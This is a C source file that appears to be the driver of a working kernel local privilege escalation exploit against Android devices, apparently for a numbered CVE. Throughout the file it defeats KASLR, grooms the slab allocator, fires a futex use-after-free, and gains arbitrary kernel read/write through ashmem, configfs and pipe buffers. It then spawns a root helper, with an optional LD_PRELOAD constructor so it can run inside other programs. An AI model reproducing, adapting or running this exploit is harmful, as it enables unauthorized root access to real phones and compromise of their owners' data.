/*
 * Coordinates one target attempt. Performs preflight checks, locates the
 * kernel, prepares the reclaimed object, runs the futex trigger, verifies
 * kernel access, and starts the root helper while tracking unsafe retry
 * states.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "08_ashmem_configfs_rw.h"
#include "00_cpu_discovery.h"
#include "04_fake_kernel_objects.h"
#include "07_futex_pi_trigger.h"
#include "05_mm_slab_grooming.h"
#include "01_kernel_base_tracefs.h"
#include "09_pipe_buffer_rw.h"
#include "10_workqueue_umh_root.h"
#include "90_diagnostic_checkpoint.h"
#include "02_slab_cache_probe.h"
#include "target.h"

static int env_int_clamped(const char *name, int fallback, int min,
                            int max) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return fallback;
  }
  errno = 0;
  char *end = NULL;
  long value = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || value < min ||
      value > max) {
    return fallback;
  }
  return (int)value;
}

static int setenv_str(const char *name, const char *value) {
  return setenv(name, value, 1);
}

static void fatal_usage(void) {
  fwrite("\x1b[31m[!] \x1b[0moperation failed\n", 1, 33, stderr);
  exit(-1);
}

static const int32_t kAttemptDelayOffsetsUsec[TARGET_ATTEMPT_DELAY_COUNT] =
    TARGET_ATTEMPT_DELAYS_USEC;

static uint64_t retry_now_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0;
  return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

static int read_retry_psi(const char *path, double *avg10) {
  FILE *fp = fopen(path, "re");
  if (!fp) return 0;
  char line[256];
  int ok = fgets(line, sizeof(line), fp) != NULL &&
           sscanf(line, "some avg10=%lf", avg10) == 1;
  fclose(fp);
  return ok;
}

static int read_retry_runnable(int *runnable) {
  FILE *fp = fopen("/proc/loadavg", "re");
  if (!fp) return 0;
  double load1, load5, load15;
  int total;
  int ok = fscanf(fp, "%lf %lf %lf %d/%d", &load1, &load5, &load15,
                  runnable, &total) == 5;
  fclose(fp);
  return ok;
}

static int wait_for_retry_stability(void) {
  struct mm_slabinfo previous = {0};
  int have_previous = 0;
  int stable = 0;
  uint64_t deadline = retry_now_ms() +
      (uint64_t)TARGET_RETRY_GATE_TIMEOUT_SEC * 1000ULL;

  while (retry_now_ms() < deadline) {
    int runnable = 0;
    double cpu_psi = 0.0, mem_psi = 0.0, io_psi = 0.0;
    struct mm_slabinfo mm = {0};
    int readable = read_retry_runnable(&runnable) &&
        read_retry_psi("/proc/pressure/cpu", &cpu_psi) &&
        read_retry_psi("/proc/pressure/memory", &mem_psi) &&
        read_retry_psi("/proc/pressure/io", &io_psi) &&
        read_mm_slabinfo(&mm);
    unsigned long mm_delta = have_previous
        ? (mm.num_slabs > previous.num_slabs
               ? mm.num_slabs - previous.num_slabs
               : previous.num_slabs - mm.num_slabs) * mm.objperslab
        : TARGET_RETRY_MAX_MM_DELTA + 1;
    int sample_ok = readable && have_previous &&
        runnable <= TARGET_RETRY_MAX_RUNNABLE &&
        cpu_psi <= TARGET_RETRY_MAX_CPU_PSI &&
        mem_psi <= TARGET_RETRY_MAX_MEM_PSI &&
        io_psi <= TARGET_RETRY_MAX_IO_PSI &&
        mm_delta <= TARGET_RETRY_MAX_MM_DELTA;
    stable = sample_ok ? stable + 1 : 0;
    fprintf(stderr,
            "[retry-gate] stable=%d/%d runnable=%d psi=%.2f/%.2f/%.2f "
            "mm=%lu/%lu slabs=%lu delta=%lu readable=%d\n",
            stable, TARGET_RETRY_GATE_STABLE_SAMPLES, runnable,
            cpu_psi, mem_psi, io_psi, mm.active_objs, mm.num_objs,
            mm.num_slabs, mm_delta, readable);
    if (stable >= TARGET_RETRY_GATE_STABLE_SAMPLES) return 1;
    if (readable) {
      previous = mm;
      have_previous = 1;
    }
    usleep(TARGET_RETRY_GATE_SAMPLE_MSEC * 1000U);
  }
  fprintf(stderr, "[retry-gate] timeout action=abort-safe\n");
  return 0;
}

enum attempt_kernel_state {
  ATTEMPT_PRE_MUTATION = 0,
  ATTEMPT_MUTATION_PENDING = 1,
  ATTEMPT_KERNEL_MUTATED = 2,
  ATTEMPT_FOPS_RESTORED = 3,
  ATTEMPT_PIPE_READY = 4,
  ATTEMPT_NATIVE_WORK_SUBMITTED = 5,
  ATTEMPT_ROOT_READY = 6,
};

struct attempt_shared_state {
  int32_t status;              /* offset 0x00: enum attempt_kernel_state */
  int32_t dirty;                /* offset 0x04: P0 handoff published */
  uint64_t slide_p0_offset;     /* offset 0x08 */
  uint64_t p0_gate_page_struct; /* offset 0x10 */
  uint64_t p0_probe_page_struct;/* offset 0x18 */
};
_Static_assert(sizeof(struct attempt_shared_state) == 0x20,
               "attempt_shared_state must occupy exactly 0x20 bytes");

static void raise_rlimit_to_max(int resource);

static int validate_executable_elf(const char *path, off_t minimum_size) {
  struct stat info;
  unsigned char magic[4];
  if (!path || path[0] != '/' || stat(path, &info) != 0 ||
      !S_ISREG(info.st_mode) || info.st_size < minimum_size ||
      access(path, X_OK) != 0) {
    return 0;
  }
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  ssize_t count;
  do {
    count = read(fd, magic, sizeof(magic));
  } while (count < 0 && errno == EINTR);
  int close_result = close(fd);
  return count == (ssize_t)sizeof(magic) && close_result == 0 &&
         memcmp(magic, "\x7f" "ELF", sizeof(magic)) == 0;
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = fork();
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(SYS_openat, AT_FDCWD, "/dev/null",
                             O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  const struct timespec hold = {.tv_sec = 86400, .tv_nsec = 0};
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

struct do_one_attempt_ctx {
  uint64_t kernel_base;
  uint64_t payload_base;
  uint64_t memstart_addr;
  uint64_t kimage_voffset;
  const char *root_umh_path;
  struct attempt_shared_state *shared;
};

static int kernel_image_linear_alias(uint64_t memstart_addr,
                                     uint64_t kimage_voffset,
                                     uint64_t kernel_address,
                                     uint64_t *linear_alias) {
  if (!linear_alias || (memstart_addr & TARGET_PAGE_MASK) != 0 ||
      (kimage_voffset & TARGET_PAGE_MASK) != 0 ||
      kernel_address < kimage_voffset) {
    return 0;
  }
  uint64_t physical = kernel_address - kimage_voffset;
  if (physical < memstart_addr) {
    return 0;
  }
  uint64_t linear_offset = physical - memstart_addr;
  if (linear_offset >= TARGET_LINEAR_MAP_END - TARGET_LINEAR_MAP_BASE) {
    return 0;
  }
  *linear_alias = TARGET_LINEAR_MAP_BASE + linear_offset;
  return 1;
}

static int read_linear_map_inputs(struct do_one_attempt_ctx *ctx, int fd) {
  if (!oss_kernel_read(fd, ctx->kernel_base + TARGET_MEMSTART_ADDR_OFF,
                       &ctx->memstart_addr, sizeof(ctx->memstart_addr)) ||
      !oss_kernel_read(fd, ctx->kernel_base + TARGET_KIMAGE_VOFFSET_OFF,
                       &ctx->kimage_voffset, sizeof(ctx->kimage_voffset))) {
    oss_diag_checkpoint("linear-alias-input-read-failed");
    return 0;
  }
  uint64_t probe = 0;
  if (!kernel_image_linear_alias(ctx->memstart_addr, ctx->kimage_voffset,
                                 ctx->kernel_base, &probe)) {
    fprintf(stderr,
            "[immediate] invalid linear alias inputs memstart=%016llx "
            "voffset=%016llx\n",
            (unsigned long long)ctx->memstart_addr,
            (unsigned long long)ctx->kimage_voffset);
    oss_diag_checkpoint("linear-alias-input-invalid");
    return 0;
  }
  return 1;
}

static int restore_ashmem_fops_via_pipe(struct do_one_attempt_ctx *ctx,
                                        int fd,
                                        uint64_t ashmem_misc_fops_addr,
                                        uint64_t real_ashmem_fops) {
  uint64_t linear_alias = 0;
  if (!kernel_image_linear_alias(ctx->memstart_addr, ctx->kimage_voffset,
                                 ashmem_misc_fops_addr, &linear_alias)) {
    fprintf(stderr,
            "[immediate] invalid image alias inputs memstart=%016llx "
            "voffset=%016llx target=%016llx\n",
            (unsigned long long)ctx->memstart_addr,
            (unsigned long long)ctx->kimage_voffset,
            (unsigned long long)ashmem_misc_fops_addr);
    oss_diag_checkpoint("fops-restore-alias-invalid");
    return 0;
  }
  oss_diag_checkpoint("fops-restore-pipe-start");
  int written = oss_pipe_rw_write(fd, linear_alias, &real_ashmem_fops,
                                  sizeof(real_ashmem_fops));
  uint64_t restored_fops = 0;
  int confirmed = written &&
                  oss_pipe_rw_read(fd, linear_alias, &restored_fops,
                                   sizeof(restored_fops)) &&
                  restored_fops == real_ashmem_fops;
  fprintf(stderr,
          "[immediate] pipe restore ashmem_misc.fops alias=%016llx "
          "got=%016llx want=%016llx write=%d confirmed=%d\n",
          (unsigned long long)linear_alias,
          (unsigned long long)restored_fops,
          (unsigned long long)real_ashmem_fops, written, confirmed);
  oss_diag_checkpoint(confirmed ? "fops-restore-confirmed"
                                : "fops-restore-unconfirmed");
  if (confirmed) {
    __atomic_store_n(&ctx->shared->status, ATTEMPT_FOPS_RESTORED,
                     __ATOMIC_RELEASE);
  }
  return confirmed;
}

static void recover_ashmem_fops(struct do_one_attempt_ctx *ctx,
                                uint64_t ashmem_misc_fops_addr,
                                uint64_t real_ashmem_fops) {
  fprintf(stderr,
          "[recovery] preserving reclaimed page for reboot target=%016llx "
          "replacement=%016llx\n",
          (unsigned long long)ashmem_misc_fops_addr,
          (unsigned long long)real_ashmem_fops);
  oss_diag_checkpoint("fops-recovery-reboot-required");
}

static int do_one_attempt_post_trigger(void *ctx_v) {
  struct do_one_attempt_ctx *ctx = (struct do_one_attempt_ctx *)ctx_v;
  uint64_t ashmem_misc_fops_addr =
      ctx->kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
  futex_v14_dbg("callback-entry"); /* H0: time from handshake entry to callback */

  __atomic_store_n(&ctx->shared->status, ATTEMPT_KERNEL_MUTATED,
                   __ATOMIC_RELEASE);

  puts("\x1b[33m[*] \x1b[0mstage=verifying-kernel-access");
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    /* The node was opened successfully during preflight. Losing it after
     * sched_setattr can mean the global fops pointer changed. Retrying after
     * that would free the reclaimed page while the kernel may still use it. */
    fprintf(stderr, "[immediate] open resolved ashmem node failed\n");
    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
    return 0;
  }
  int verified = oss_verify_kernel_access_ex(
      fd, ashmem_misc_fops_addr, ctx->payload_base, NULL);
  fprintf(stderr, "[immediate] verify (called immediately, same thread) = %d\n",
          verified);
  if (!verified) {
    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
    return 0;
  }

  /* ConfigFS AAR is used only before pipe installation. Everything after
   * oss_pipe_rw_install() reads through the pipe and the linear alias. */
  if (!read_linear_map_inputs(ctx, fd)) {
    fprintf(stderr, "[immediate] linear alias input read failed\n");
    recover_ashmem_fops(ctx, ashmem_misc_fops_addr,
                        ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF);
    return 0;
  }

  oss_diag_checkpoint("pipe-install-start");
  puts("\x1b[33m[*] \x1b[0mstage=starting-temporary-root");
  if (!oss_pipe_rw_install(fd, ctx->kernel_base, ctx->payload_base)) {
    fprintf(stderr, "[immediate] pipe physical R/W install failed\n");
    oss_diag_checkpoint("pipe-install-failed");
    close(fd);
    return 0;
  }
  oss_diag_checkpoint("pipe-install-ready");

  uint64_t real_ashmem_fops = ctx->kernel_base + TARGET_ASHMEM_FOPS_OFF;
  if (!restore_ashmem_fops_via_pipe(
          ctx, fd, ashmem_misc_fops_addr, real_ashmem_fops)) {
    fprintf(stderr, "[immediate] physical ashmem fops restore failed\n");
    return 0;
  }
  __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                   __ATOMIC_RELEASE);

  /* Root bootstrap publishes a disposable PTY work item through the kernel's
   * native schedule_work() path and restores the PTY after completion. */
  oss_diag_checkpoint("root-umh-start");
  int rooted = root_umh_install_fd_tracked(
      fd, ctx->kernel_base, ctx->payload_base, ctx->memstart_addr,
      ctx->kimage_voffset, ctx->root_umh_path, &ctx->shared->status,
      ATTEMPT_NATIVE_WORK_SUBMITTED);
  oss_diag_checkpoint(rooted ? "root-umh-ready" : "root-umh-failed");
  uint64_t null_owner = 0;
  int owner_cleared = oss_pipe_rw_write(
      fd, ctx->payload_base | TARGET_PRIMARY_FOPS_LIVE_OFF, &null_owner,
      sizeof(null_owner));
  fprintf(stderr, "[immediate] fake fops owner clear=%d\n", owner_cleared);
  close(fd);
  rooted = rooted && owner_cleared;
  if (rooted) {
    __atomic_store_n(&ctx->shared->status, ATTEMPT_ROOT_READY,
                     __ATOMIC_RELEASE);
    puts("\x1b[32m[+] \x1b[0mstage=temporary-root-ready");
  }
  return rooted;
}

static int do_one_attempt(struct attempt_shared_state *shared,
                           int pselect_delay_usec) {
  (void)pselect_delay_usec;
  puts("\x1b[33m[*] \x1b[0mstage=preparing-kernel-access");

  raise_rlimit_to_max(RLIMIT_NOFILE);
  raise_rlimit_to_max(RLIMIT_NPROC);

  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!validate_executable_elf(root_umh_path, 4096)) {
    fprintf(stderr, "[preflight] invalid root helper errno=%d\n", errno);
    return 0;
  }
  const char *mm_factory_path = getenv("CVE43499_MM_FACTORY");
  if (!validate_executable_elf(mm_factory_path, 1)) {
    fprintf(stderr, "[preflight] invalid mm exec factory errno=%d\n", errno);
    return 0;
  }

  if (!oss_prepare_kernel_rw_path()) {
    fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
    return 0;
  }
  struct cpu_discovery_result cpu_result;
  if (!cpu_discovery_select(&cpu_result) ||
      !cpu_discovery_pin_and_validate(cpu_result.cpu, &cpu_result)) {
    fprintf(stderr, "[preflight] groom CPU selection failed errno=%d\n", errno);
    return 0;
  }
  groom_set_cpu(cpu_result.cpu);
  fprintf(stderr,
          "[groom] cpu selected=%d capacity=%ld max_freq_khz=%ld "
          "core_ctl_known=%d paused=%d not_preferred=%d\n",
          cpu_result.cpu, cpu_result.capacity, cpu_result.max_frequency_khz,
          cpu_result.core_ctl_known, cpu_result.paused,
          cpu_result.not_preferred);

  puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
  uint64_t kernel_base = 0;
  uint64_t p0_offset = 0;

  const char *forced_offset = getenv("SLIDE_P0_OFFSET");
  int has_forced_offset = forced_offset && *forced_offset;
  if (has_forced_offset) {
    errno = 0;
    char *end = NULL;
    p0_offset = strtoull(forced_offset, &end, 0);
    if (errno || end == forced_offset || *end != '\0' ||
        p0_offset > TARGET_KASLR_MAX_SLIDE ||
        (p0_offset & (TARGET_KASLR_ALIGNMENT - 1ULL)) != 0) {
      fprintf(stderr, "[kaslr] invalid SLIDE_P0_OFFSET\n");
      return 0;
    }
  }
  if (!kaslr_locate_via_tracefs(&kernel_base)) {
    if (!has_forced_offset) {
      return 0;
    }
    kernel_base = TARGET_KIMAGE_TEXT_BASE + p0_offset;
    fprintf(stderr,
            "[kaslr] source=forced-p0 base=%016llx p0_offset=%016llx\n",
            (unsigned long long)kernel_base,
            (unsigned long long)p0_offset);
  }
  puts("\x1b[33m[*] \x1b[0mstage=kernel-location-ready");
  __atomic_store_n(&shared->p0_gate_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->p0_probe_page_struct, 0, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->slide_p0_offset, p0_offset, __ATOMIC_RELEASE);
  __atomic_store_n(&shared->dirty, 1, __ATOMIC_RELEASE);

  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    fprintf(stderr,
            "[mode] SLIDE_ONLY/P0_ONLY set: stopping after KASLR "
            "locate, as designed\n");
    return 1;
  }

  uint64_t init_task_addr = kernel_base + TARGET_INIT_TASK_OFF;
  uint64_t ashmem_misc_fops_addr =
      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;

  uint64_t payload_base = groom_and_install_fops_object(
      kernel_base, ashmem_misc_fops_addr, init_task_addr);
  if (!payload_base) {
    fprintf(stderr, "[groom] failed before reaching the reclaim step\n");
    return 0;
  }
  fprintf(stderr,
          "[groom] installed fops object at payload_base=%016llx "
          "target(ashmem_misc_fops)=%016llx init_task=%016llx\n",
          (unsigned long long)payload_base,
          (unsigned long long)ashmem_misc_fops_addr,
          (unsigned long long)init_task_addr);

  if (!oss_verify_kernel_access_plan_supported(ashmem_misc_fops_addr,
                                                payload_base) ||
      !oss_kernel_read_plan_supported(
          kernel_base + TARGET_MEMSTART_ADDR_OFF, sizeof(uint64_t)) ||
      !oss_kernel_read_plan_supported(
          kernel_base + TARGET_KIMAGE_VOFFSET_OFF, sizeof(uint64_t))) {
    fprintf(stderr,
            "[preflight] ConfigFS plan rejected before futex "
            "payload=%016llx errno=%d(%s); retry is safe\n",
            (unsigned long long)payload_base, errno, strerror(errno));
    oss_diag_checkpoint("configfs-plan-pretrigger-rejected");
    return 0;
  }
  oss_diag_checkpoint("configfs-plan-pretrigger-ok");

  /* root_umh_path was validated before KASLR and allocator grooming. */

  /* BISECT_VARIANT is a project-only diagnostic switch. The default v14
   * now carries the -1 -> gate -> SIGUSR1 -> 1 -> sched_setattr
   * handshake and keeps the post-sigreturn window free of libc/syscalls. */
  struct do_one_attempt_ctx ctx = {
      .kernel_base = kernel_base,
      .payload_base = payload_base,
      .root_umh_path = root_umh_path,
      .shared = shared,
  };
  const char *bisect = getenv("BISECT_VARIANT");
  int triggered;
  if (bisect && strcmp(bisect, "13") == 0) {
    fprintf(stderr, "[futex] BISECT_VARIANT=13 blocked: no pre-mutation state\n");
    return 0;
  } else if (bisect && strcmp(bisect, "14") == 0) {
    triggered = run_futex_trigger_v14_full_staged(
        payload_base, ashmem_misc_fops_addr, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_post_trigger, &ctx);
  } else {
    triggered = run_futex_trigger_v14_full_staged(
        payload_base, ashmem_misc_fops_addr, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_post_trigger, &ctx);
  }
  fprintf(stderr, "[futex] trigger result=%d\n", triggered);
  if (triggered ||
      __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE) != 0) {
    pid_t keeper = spawn_allocation_keeper();
    if (keeper < 0) {
      fprintf(stderr, "[holder] fork failed errno=%d\n", errno);
      return 0;
    }
    fprintf(stderr, "[holder] pid=%d name=cve43499-hold\n", keeper);
  }
  return triggered;
}

static void raise_rlimit_to_max(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
  rl.rlim_cur = rl.rlim_max;
  if (setrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
}

static int app_main(void) {
  const char *contract_path = getenv("BOPE_TARGET_CONTRACT");
  if (!rmg_runtime_load(contract_path)) {
    fprintf(stderr, "[BOPE] missing or invalid runtime target contract\n");
    return -1;
  }
  if (!oss_pipe_runtime_layout_ok() || !oss_umh_runtime_layout_ok()) {
    fprintf(stderr, "[BOPE] runtime contract has incompatible object layouts\n");
    return -1;
  }
  if (getenv("BOPE_CONTRACT_CHECK_ONLY")) {
    puts("[BOPE] runtime contract accepted");
    return 0;
  }
  struct timespec payload_started;
  if (clock_gettime(CLOCK_MONOTONIC, &payload_started) == -1) {
    fatal_usage();
  }

  if (setvbuf(stdin, NULL, _IONBF, 0) == -1 ||
      setvbuf(stdout, NULL, _IONBF, 0) == -1 ||
      setvbuf(stderr, NULL, _IONBF, 0) == -1) {
    fatal_usage();
  }

  puts("[BOPE] Brazilian Open Payload Engine initialized");

  int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
  struct timespec boot_now;
  if (clock_gettime(CLOCK_BOOTTIME, &boot_now) == -1) {
    fatal_usage();
  }
  if (boot_quiet_sec > 0 && boot_now.tv_sec < boot_quiet_sec) {
    unsigned int remaining = (unsigned int)(boot_quiet_sec - boot_now.tv_sec);
    printf("\x1b[33m[*] \x1b[0mwaiting for boot allocator quiet window "
           "seconds=%u\n",
           remaining);
    do {
      remaining = sleep(remaining);
    } while (remaining != 0);
  } else {
    printf("\x1b[33m[*] \x1b[0mboot allocator quiet window skipped "
           "BOOT_QUIET_SEC=%d boottime=%llds\n",
           boot_quiet_sec, (long long)boot_now.tv_sec);
  }

  int attempts = env_int_clamped("EXPLOIT_ATTEMPTS", 8, 1, 0x40);
  int pselect_delay_usec =
      env_int_clamped("PSELECT_DELAY_USEC", 20000, 0, 1000000);
  int attempt_timeout_sec =
      env_int_clamped("EXPLOIT_ATTEMPT_TIMEOUT_SEC", 90, 5, 900);
  int p0_timeout_sec = env_int_clamped(
      "P0_ATTEMPT_TIMEOUT_SEC", 20, 5, attempt_timeout_sec);
  if (p0_timeout_sec > attempt_timeout_sec) {
    p0_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY")) {
    attempts = 1;
  }

  struct attempt_shared_state *shared = mmap(
      NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shared == MAP_FAILED) {
    fatal_usage();
  }
  memset(shared, 0, sizeof(*shared));

  unsetenv("LD_PRELOAD");

  printf("\x1b[33m[*] \x1b[0mstarting exploit attempts=%d\n", attempts);

  int success = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    printf("\x1b[33m[*] \x1b[0mexploit attempt=%d/%d\n", attempt, attempts);

    pid_t child = fork();
    if (child == 0) {
      if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
        fatal_usage();
      }
      if (getppid() == 1) {
        _exit(1);
      }
      int delay = pselect_delay_usec +
                  kAttemptDelayOffsetsUsec[(attempt - 1) % 8];
      if (delay < 0) {
        delay = 0;
      }
      char delay_arg[16];
      snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
      if (setenv_str("PSELECT_DELAY_USEC", delay_arg) == -1) {
        fatal_usage();
      }
      char attempt_arg[16];
      snprintf(attempt_arg, sizeof(attempt_arg), "%d", attempt);
      if (setenv_str("S23_SUPERVISOR_ATTEMPT", attempt_arg) == -1) {
        fatal_usage();
      }
      int ok = do_one_attempt(shared, delay);
      _exit(ok ? 0 : 1);
    }
    if (child == -1) {
      fatal_usage();
    }

    struct timespec started;
    if (clock_gettime(CLOCK_MONOTONIC, &started) == -1) {
      fatal_usage();
    }
    int status = 0;
    pid_t waited;
    int mutation_timeout_reported = 0;
    int mutation_pending_reported = 0;
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited == -1 && errno != EINTR) {
        fatal_usage();
      }
      struct timespec now;
      if (clock_gettime(CLOCK_MONOTONIC, &now) == -1) {
        fatal_usage();
      }
      long elapsed_sec = now.tv_sec - started.tv_sec;
      int observed_kernel_state =
          __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
      if (observed_kernel_state >= ATTEMPT_MUTATION_PENDING &&
          !mutation_pending_reported) {
        fprintf(stderr, "stage=kernel-mutation-pending state=%d\n",
                observed_kernel_state);
        mutation_pending_reported = 1;
      }
      int budget =
          (getenv("SLIDE_P0_OFFSET") ||
           __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE))
              ? attempt_timeout_sec
              : p0_timeout_sec;
      if (elapsed_sec >= budget) {
        int kernel_state =
            __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
        if (kernel_state != ATTEMPT_PRE_MUTATION) {
          if (!mutation_timeout_reported) {
            fprintf(stderr,
                    "[supervisor] timeout after kernel mutation state=%d; "
                    "preserving child and holders until natural completion\n",
                    kernel_state);
            mutation_timeout_reported = 1;
          }
          usleep(100000);
          continue;
        }
        if (kill(child, SIGKILL) == -1) {
          fatal_usage();
        }
        do {
          waited = waitpid(child, &status, 0);
        } while (waited == -1 && errno == EINTR);
        if (waited == -1) {
          fatal_usage();
        }
        break;
      }
      usleep(100000);
    }

    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      printf("\x1b[32m[+] \x1b[0mexploit completed attempt=%d/%d\n",
             attempt, attempts);
      success = 1;
      break;
    }

    if (__atomic_load_n(&shared->status, __ATOMIC_ACQUIRE)) {
      fprintf(stderr,
              "stage=kernel-mutation-pending state=%d\n"
              "[supervisor] kernel mutation reached; refusing unsafe retry "
              "before reboot\n",
              __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE));
      break;
    }

    if (!getenv("SLIDE_P0_OFFSET") &&
        __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE)) {
      uint64_t slide_p0_offset = __atomic_load_n(
          &shared->slide_p0_offset, __ATOMIC_ACQUIRE);
      uint64_t gate_page_struct = __atomic_load_n(
          &shared->p0_gate_page_struct, __ATOMIC_ACQUIRE);
      uint64_t probe_page_struct = __atomic_load_n(
          &shared->p0_probe_page_struct, __ATOMIC_ACQUIRE);
      char offset_arg[16];
      char gate_arg[24];
      char probe_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%llx",
               (unsigned long long)slide_p0_offset);
      snprintf(gate_arg, sizeof(gate_arg), "0x%llx",
               (unsigned long long)gate_page_struct);
      snprintf(probe_arg, sizeof(probe_arg), "0x%llx",
               (unsigned long long)probe_page_struct);
      if (setenv_str("SLIDE_P0_OFFSET", offset_arg) == -1 ||
          setenv_str("P0_GATE_PAGE_STRUCT", gate_arg) == -1 ||
          setenv_str("P0_PROBE_PAGE_STRUCT", probe_arg) == -1) {
        fatal_usage();
      }
    }

    if (attempt < attempts && !wait_for_retry_stability()) {
      break;
    }
  }

  munmap(shared, sizeof(*shared));
  if (success) {
    struct timespec payload_finished;
    if (clock_gettime(CLOCK_MONOTONIC, &payload_finished) == -1) {
      fatal_usage();
    }
    long elapsed_seconds = payload_finished.tv_sec - payload_started.tv_sec;
    if (payload_finished.tv_nsec > payload_started.tv_nsec) {
      elapsed_seconds++;
    }
    if (elapsed_seconds < 1) {
      elapsed_seconds = 1;
    }
    rmg_log_success((int)elapsed_seconds);
  }
  return success ? 0 : -1;
}

#if defined(BUILD_LD_PRELOAD) && BUILD_LD_PRELOAD

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  int status = app_main();
  if (status != 0) {
    exit(status);
  }
}
#else
int main(void) {
  return app_main();
}
#endif
